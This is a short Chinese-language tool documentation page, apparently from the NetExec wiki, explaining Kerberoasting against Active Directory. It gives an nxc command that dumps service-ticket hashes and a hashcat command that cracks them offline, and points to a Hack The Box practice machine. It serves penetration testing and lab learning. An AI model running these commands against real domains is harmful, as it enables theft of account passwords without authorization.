---
description: 使用 Kerberoasting 获取 Kerberos 5 TGS-REP etype 23 哈希
---

# Kerberoasting

你可以使用 Kerberoasting 技术获取 Kerberos 5 TGS-REP etype 23 哈希

> Kerberoasting 的目标是获取在 AD 中代表用户账户(而不是计算机账户)运行的服务的 TGS 票据。因此,这些 TGS 票据的一部分是使用从用户密码派生的密钥加密的。因此,他们的凭证可以离线破解。更多细节请参见 [Kerberos 理论](https://www.tarlogic.com/en/blog/how-kerberos-works/)。

{% hint style="warning" %}
要执行此攻击,你需要在域上有一个账户
{% endhint %}

```
nxc ldap 192.168.0.104 -u harry -p pass --kerberoasting output.txt
```

### 使用 hashcat 破解

```
hashcat -m13100 output.txt wordlist.txt
```

### 示例

Active 机器是使用 NetExec 测试 **Kerberoasting** 的一个很好的例子

{% embed url="https://www.hackthebox.eu/home/machines/profile/148" %}

### 有用的资源:

{% embed url="https://www.tarlogic.com/en/blog/how-to-attack-kerberos/" %}

{% embed url="https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting" %}

{% embed url="https://en.hackndo.com/kerberoasting/" %}
